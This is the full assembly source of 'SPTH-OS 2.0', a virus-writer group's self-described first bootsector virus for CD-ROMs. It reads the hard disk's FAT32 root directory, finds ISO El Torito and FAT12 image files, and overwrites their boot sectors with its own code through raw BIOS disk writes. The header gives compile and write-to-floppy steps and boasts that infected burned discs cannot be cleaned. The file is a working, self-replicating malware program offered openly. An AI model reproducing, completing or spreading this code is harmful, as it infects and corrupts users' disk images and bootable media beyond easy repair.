;  SPTH-OS 2.0
;  by Second Part To Hell/[rRlf]
;  www.spth.de.vu
;  spth@priest.com
;  written from January 2005 - April 2005
;  in Austria
;
;  What you can see below is the world's first bootsectorvirus for CD-ROMs.
;
;  The virus infects ISO-9660 El Torito Images in the Root Directory of the
;  first partition on the Harddisk. It also infects FAT12 .IMG Imagefiles.
;
;  El Torito is maybe the most often used Bootable CD-Image, and it's used by
;  for instance Ahead Nero Burning-ROM.
;
;  When the virus infects an ISO image, and the user burns this image to a
;  CD-ROM, the CD-ROM is infected, and the virus can not be removed anymore.
;  When the user now forgets the CD-ROM in the drive, and BIOS tests the
;  CD-Boot, the next images became infected.
;  
;
;  The features:
;    - First CD-ROM bootsector virus
;    - Works at CD-ROMs and floppys
;    - Own FAT32 Filesystem driver
;    - ISO-9660 El Torito Images infection
;    - FAT12 Image file infection
;
;  The differences to other bootsector virus is, that it does not use the OS's
;  functions but use it's own Filesystem driver. This was of course a lot of
;  work, but I guess that it was a success.
;
;  There is one known bug: the virus does not infect files at very huge and
;  full-trashed root directories, as it just searchs files in the first 16
;  sectors (256 entries), but this is very unusual. (But you have to know that
;  also deleted files/dirs are saved in the root directory)
;
;  Compile:
;  - - -
;  del kernel.bin
;  cls
;  fasm kernel.asm kernel.bin
;  rawrite -f kernel.bin -d A -n
;  pause
;  shutdown -r -f -t 1 -c "SPTH-OS v2.0"
;  - - -
;
;  Well, the first prove-of-concept CD-ROM bootsector virus has been writen,
;  now let's move to other projects...
;
;
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

	org 0x7c00				; Offsets + 0x7C00, as the bootsector will be loaded at 0x7C00
stfat:
 jmp		 startboot			; Jump over FAT12 table
 nop
 db 0x4D,0x53,0x44,0x4F,0x53,0x35,0x2E,0x30	; FAT12 Table
 db 0x00,0x02,0x01,0x01,0x00,0x02,0xE0,0x00
 db 0x40,0x0B,0xF0,0x09,0x00,0x12,0x00,0x02
 db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
 db 0x00,0x00,0x00,0x29,0x8C,0x22,0x2F,0x7C
 db 0x4E,0x4F,0x20,0x4E,0x41,0x4D,0x45,0x20
 db 0x20,0x20,0x20,0x46,0x41,0x54,0x31,0x32
 db 0x20,0x20,0x20


startboot:
	cli					; No Interrupts
	mov	ax,0x9000			; Make the stack at 0x9000
	mov	ss, ax				; Stack=0x9000
	mov	sp, 0				; Stackpointer=0x0
	sti					; Allow Interrupts

	mov	[bootdrv], dl			; Save the bootdevice

loada:
	push	ds				; Save DS
	mov	ax, 0				; Function: Diskdrive reset
	mov	dl, [bootdrv]			; Bootdevice to dl
	int	0x13				; Execute
	pop	ds				; Get DS
	jc	loada				; If Error, do it again


load1:
	mov	ax, 0x1000			; Where to read: 0x1000
	mov	es, ax				; ES=0x1000
	mov	bx, 0				; BX=0
	mov	ah, 0x2				; Read sectors
	mov	al, 0x3				; Read 3 sectors
	mov	cx, 2				; Start at sector 2
	mov	dx, 0				; At current disk (or emulated disk)
	int	0x13				; Execute
	jc	load1				; If error, do it again

	mov	ax, 0x1000			; AX=0x1000
	mov	es, ax				; ES=0x1000
	mov	ds, ax				; DS=0x1000
	push	ax				; push 0x1000 to stack
	mov	ax, 0				; AX=0x0
	push	ax				; push 0x0 to stack
	retf

	bootdrv db 0				; Byte for bootdevice

endboot:
	times (512-(endboot-stfat)-2) db 0
	dw 0xAA55

	org	0x0			; Offsets + 0x0
start:
	mov	bx, 0x2000		; bx=0x2000
	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	ah, 0x2			; Read
	mov	al, 0x1			; 1 Sector
	mov	cl, 1			; Start at sector 1
	mov	ch, 0			; Cylinder=0
	mov	dh, 0			; Head=0
	mov	dl, 0x80		; Drive=0x80=HD
	int	0x13			; Read MBR

	xor	bx, bx			; bx=0=Start of MBR
	mov	ax, [bx+454]		; ax=1st Partition's start: Partitiontable (446) + 8 = 454
	mov	cl, [bx+447]		; cl=Sector of 1st Partition in CHS: 446 + 1 = 447
	mov	dh, [bx+448]		; dh=Head of 1st Partition in CHS: 446 + 2 = 448
	mov	ch, [bx+449]		; ch=Cylinder of 1st Partition in CHS: 446 + 3=449

	mov	bx, 0x1000		; bx=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	[BootSecPar], ax	; Save 1st Partition's start in LBA

	mov	ah, 0x2			; Read
	mov	al, 0x10		; 16 Sector
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x2000		; bx=0x2000
	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, bx
	xor	bx, bx			; BX=0x0
	int	0x13			; Read First Sector of Partition

	xor	bx, bx			; BX=0x0
	mov	ah, [bx+24]		; ah=BPB_SecPerTrk: For CHS calculation
	mov	al, [bx+26]		; al=BPB_NumHeads: For CHS calculation

	mov	cl, [bx+13]		; cl=Sector per cluster
	mov	ch, [bx+16]		; ch=Number of FATs
	mov	si, [bx+14]		; si=Reserved Sectors
	mov	ebp, [bx+44]		; ebp=RootCluster
	mov	edx, [bx+36]		; edx=Sectors per FAT

	mov	bx, 0x1000		; bx=0x2000
	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	[TotalSector], ah	; Save BPB_SecPerTrk
	mov	[TotalHead], al		; Save BPB_NumHeads

	mov	[SecPerClust], cl	; Save Sector per cluster
	mov	[ReservedSec], si	; Save Reserved Sector
	mov	[NumOfFats], ch		; Save Number Of FATs
	mov	[SecPerFat], edx	; Save Sector Per FAT
	mov	[LBA], ebp		; Save Root Cluster

	call	getLBA			; Get the real sector number
					; Returns the real sector number in EAX

	call	CHS			; CHS

	mov	ah, 0x2			; Read
	mov	al, 0x10		; 16 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x2000		; bp=0x2000
	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, bx
	xor	bx, bx
	int	0x13			; Read Sectors

fat32read:
	mov	cx, 0x2000		; cx=0x2000
	mov	es, cx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, cx

	mov	ah, [bx]		; ah=First byte of Filename
	test	ah, ah	 		; Check if zero. If zero, it's the last entry
	jz	ende_a			; If it's the last entry of this directory, stopp the filesearching
	cmp	ah, 0xE5		; Check if the byte is 0xE5. If so, it's a deleted file
	je	fat32next		; If deleted file, get next entry

	mov	al, [bx+2]		; al=3rd letter of name
	test	al, al			; Check if zero
	jz 	fat32next		; If zero, get next entry

	mov	al, [bx+11]		; Move the Filetype to AL
	cmp	al, 0x10		; Compaire with 0x10 (=Directory)
	je	fat32next		; If it's a directory, save the cluster

	mov	ax, word [bx+8]		; 9th and 10th Letter to ax
	cmp	ax, 'IM'		; Check if it's 'IM'
	jne	fat32noimg		; If not, no IMG file
	mov	al, byte [bx+10]	; Move 10th letter to al
	cmp	al, 'G'			; Check if 10th letter='G'
	jne	fat32noimg		; If not, no IMG file
	mov	eax, [bx+0x1C]		; eax=Size of file
	cmp	eax, (totalend-start)+512	; Minimum size of file: 1st sector+viruslength
	js	fat32next		; If not big enough, not infect this file

	push	bx
	call	infectionIMG		; Infection!
	pop	bx

fat32noimg:
	mov	ax, word [bx+8]		; 9th and 10th Letter to ax
	cmp	ax, 'IS'		; Check if it's 'IS'
	jne	fat32noiso		; If not, no ISO file
	mov	al, byte [bx+10]	; Move 10th letter to al
	cmp	al, 'O'			; Check if 10th letter='S'
	jne	fat32noimg		; If not, no IMG file


	push	bx
	call	infectionISO		; Infection!
	pop	bx

fat32noiso:
fat32next:
	add	bx, 0x20		; Next entry
jmp  fat32read


infectionIMG:

	mov	ax, [bx+20]		; High number of cylinder to ax
	shl	eax, 0x10		; High number in e-part of eax
	mov	ax, [bx+26]		; Low number of cylinder to ax

	mov	bx, 0x1000		; ax=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0
	mov	[LBA], eax		; DataCluster=EAX

	call	getLBA			; Get the real sector number
					; Returns the sector number in EAX
	mov	[LBA], eax		; Save the LBA
	call	CHS			; Get the CHS of the real sector number

	mov	ah, 0x2			; Read
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	int	0x13			; Read Sectors

	mov	eax, [bx+0x37]		; At 0x36: "FAT12"-mark
	cmp	eax, 'AT12'		; Compaire the values
	call	infectimgwrite		; If equal, infect it
ret					; Otherwise return to the file-search procedure

infectimgwrite:
	mov	ax, 0x1000		; AX=0x1000 (Virus in Memory)
	mov	ds, ax			; DS=0x1000
	mov	ax, 0x3000		; AX=0x3000 (Bootsector of File in Memory)
	mov	es, ax
	mov	cx, 62			; Length of 1st sector data
	mov	si, fat12bootsector	; Where the data is
	mov	di, 0x3E		; The FAT12 at 1st sector in IMG file
	rep	movsb			; Move CX bytes from DS:SI to ES:DI
					; Move 62 bytes from 0x1000:data1stsector to 0x3000:0x3E

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	ax, 0x3CEB		; AX=Jmp over FAT12 Table
	mov	[bx], ax		; Write the JMP to the changed sector

	mov	bx, 0x1000		; bx=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	ah, 0x3			; Write
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0
	int	0x13			; Write Bootsector

	mov	bx, 0x1000		; bx=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	cx, 3			; Do it 3 times
   WriteSecs:
	push	cx
	push	bx

	mov	eax, [LBA]

	mov	edx, 4
	sub	dx, cx
	add	eax, edx		; Get next sector
	xor	edx, edx

	call	CHS			; CHS
	pop	bx			; restore bx

	mov	ah, 0x3			; Write
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=??
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD
	int	0x13			; Write Sectors

	pop	cx			; Restore cx

	add	bx, 0x200		; Next sector
   loop WriteSecs
ret

infectionISO:

	mov	ax, [bx+20]		; High number of cylinder to ax
	shl	eax, 0x10		; High number in e-part of eax
	mov	ax, [bx+26]		; Low number of cylinder to ax

	mov	bx, 0x1000		; ax=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	[LBA], eax		; DataCluster=EAX

	call	getLBA			; Get the sector number
	push	eax			; Save the start of the file
	add	eax, 17*4		; Bootrecord Volume is ALWAYS at CD-ROM Sector 17
					; A CD-ROM sector is ALWAYS 0x800
					; A HD sector is ALWAYS (?) 0x200 (0x200*4[!]=0x800)
					; We now have the sector of the Boot Record Volume of the ISO file at the HD

	call	CHS			; Now calculate the CHS


	mov	ah, 0x2			; Read
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	int	0x13			; Read Sector
					; Now we have the Boot Record Volume

	pop	ecx			; ECX=Start of file

	mov	eax, [bx+7]		; Move Byte 7-10 to eax
	cmp	eax, 'EL T'		; Check if it's a bootable ISO file
					; String should be 'EL TORITO SPECIFICATION'
	jne	EndISOInfection		; If not: SHIT! ;)

	push	ecx			; Save the Start of the file again

	mov	eax, [bx+71]		; Move the 'Absolute pointer to first sector of Boot Catalog' to eax
	mov	edx, 4
	mul	edx			; You know: 0x800/0x200=4; Now it's the right sectornumber

	add	eax, ecx		; Sector number at HD

	mov	bx, 0x1000		; bx=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0


	call	CHS			; Get the CHS
	
	mov	ah, 0x2			; Read
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	int	0x13			; Read Sector
					; Now we have the Boot Catalog

	pop	ecx			; Get Start of the file
	mov	al, [bx+32]		; AL=Boot Indicator: 0x88=bootable
	cmp	al, 0x88		; Check if it's bootable
	jne	EndISOInfection		; If not: SHIT! ;)

	mov	eax, [bx+40]		; This is the start sector of the virtual Disk
	mov	edx, 4			; EDX=4
	mul	edx			; EAX=The real Sector in the file
	add	eax, ecx		; EAX=The Sector of it on the HD

	mov	bx, 0x1000		; bx=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	[LBA], eax
	call	CHS			; Get the CHS

	mov	ah, 0x2			; Read
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	int	0x13			; Read Sector
					; Now we have the Bootsector of the virtual Disk

	call	infectimgwrite		; Infect the file!!!

EndISOInfection:
ret


ende_a:
	mov	ax, 0x1000		; ax=0x1000
	mov	es, ax			; Data will be read to ES:BX, ES=0x1000
	mov	ds, ax
	xor	bx, bx			; BX=0x0

	mov	cx, 116			; 116 Letters
	mov	si, endmsg 		; si=Offset of String
	jmp eee
   putstra:
	lodsb				; [si]->al
	mov	ah, 0xE 		; ah=0xE: Print Letter to Screen
	mov	bx, 0x7
	int	0x10			; call
   loop	putstra				; Next Letter
	mov	al, 13
	mov	ah, 0xE
	mov	bx, 0x7
	int	0x10
	mov	al, 10
	mov	ah, 0xE
	mov	bx, 0x7
	int	0x10
   ret
eee: call putstra
	mov	ah, 0			; ah=0: Get Key BIOS Function
	int	0x16			; Call
	jmp	reboot			; Now let's reboot!


CHS:
	xor	ebx, ebx		; ebx=0
	mov	bl, [TotalSector]	; Total Sectors
	div	ebx			; EDX:EAX DIV EBX=
					; EAX= Quotient
					; EDX= Reminder
	inc	dx			; Reminder+1=Sector
	mov	[sector], dl		; Sector=Reminder (not more than 0xFF)
	mov	[cylhead], eax

	mov	edx, eax		; EDX=Quotient
	shr	edx, 16			; DX=High number of quotient

	xor	bx, bx			; BX=0
	mov	bl, [TotalHead]		; Total Heads
	div	bx			; DX:AX DIV BX=
					; AX= Quotient
					; DX= Reminder

	mov	[head], dl		; Head=Reminder
	mov	[cylinder], al		; Cylinder=Quotient
	shl	ah, 6			; 0000 00?? -> ??00 0000
	mov	al, [sector]		; high two bits of cylinder (bits 6-7, hard disk only)
	or	al, ah			; 00xx xxxx -> ??xx xxxx
	mov	[sector], al		; Save!
ret

getLBA:
	;; Find Data: 
	;; (boot sector)+(number of fats)*(sectors per fat)+(reserved sectors)+(Data cluster-2)*(sectors per cluster)
	;; DataCluster saved in LBA

	mov	eax, [SecPerFat]	; eax=SecPerFat
	xor	bx, bx			; bx=0
	mov	bl, [NumOfFats]		; bl=NumOfFats
	mul	bx			; AX*BX=DX:AX

	mov	[FATCalc], ax		; Save the result

	xor	eax, eax		; EAX=0
	mov	al, [SecPerClust]	; al=SecPerClust
	mov	ebx, [LBA]		; ebx=DataCluster
	sub	ebx, 2			; DataCluster-=2

	mul	ebx			; EAX*EBX=EDX:EAX

	mov	[ClustCalc], eax	; Save the result

	xor	eax, eax		; eax=0
	mov	ax, [BootSecPar]	; AX=Sectors before the 1st partition
	xor	ebx, ebx		; ebx=0
	mov	bx, [FATCalc]		; BX=(number of fats)*(sectors per fat)
	add	eax, ebx		; AX+=BX
	mov	bx, [ReservedSec]	; BX=Reserved Sectors
	add	eax, ebx		; AX+=BX
	mov	ebx, [ClustCalc]	; BX=(Root Cluster-2)*(Sectors per Cluster)
	add	eax, ebx		; AX+=BX

	xor	edx, edx		; EDX=0
ret

	endmsg		db 13,10,13,10,13,10
			db 'Thank you for using SPTH-OS 2.0!',13,10
			db 'This may spread better then Windows(c)(r)tm ;-)',13,10
			db 'by Second Part To Hell/rRlf'

	sector		db 0x0
	head		db 0x0
	cylinder	db 0x0, 0x0
	cylhead		dd 0x0
	bit2cyl		db 0x0
	LBA		dd 0x0
	BootSecPar	dw 0x0

	TotalSector	db 0x0			; BPB_SecPerTrk: For CHS calculation
	TotalHead	db 0x0			; BPB_NumHeads: For CHS calculation

	SecPerClust	db 0x0			; Offset 13
	ReservedSec	dw 0x0			; Offset 14
	NumOfFats	db 0x0			; Offset 16
	SecPerFat	dd 0x0			; Offset 36

	FATCalc		dw 0x0			; NumOfFats*SecPerFat (should not be greater than 0xFFFF)
	ClustCalc	dd 0x0			; (RootClust-2)*(SecPerClust)

fat12bootsector:
	db 0xFA,0xB8,0x00,0x90,0x8E,0xD0,0xBC,0x00
	db 0x00,0xFB,0x88,0x16,0x7C,0x7C,0x1E,0xB8
	db 0x00,0x00,0x8A,0x16,0x7C,0x7C,0xCD,0x13
	db 0x1F,0x72,0xF3,0xB8,0x00,0x10,0x8E,0xC0
	db 0xBB,0x00,0x00,0xB4,0x02,0xB0,0x03,0xB9
	db 0x02,0x00,0xBA,0x00,0x00,0xCD,0x13,0x72
	db 0xEA,0xB8,0x00,0x10,0x8E,0xC0,0x8E,0xD8
	db 0x50,0xB8,0x00,0x00,0x50,0xCB

reboot:
	db 	0xEA			; Hexdump for reboot: jmp 00FF:FF00
	dw 	0x0
	dw 	0xFFFF

totalend: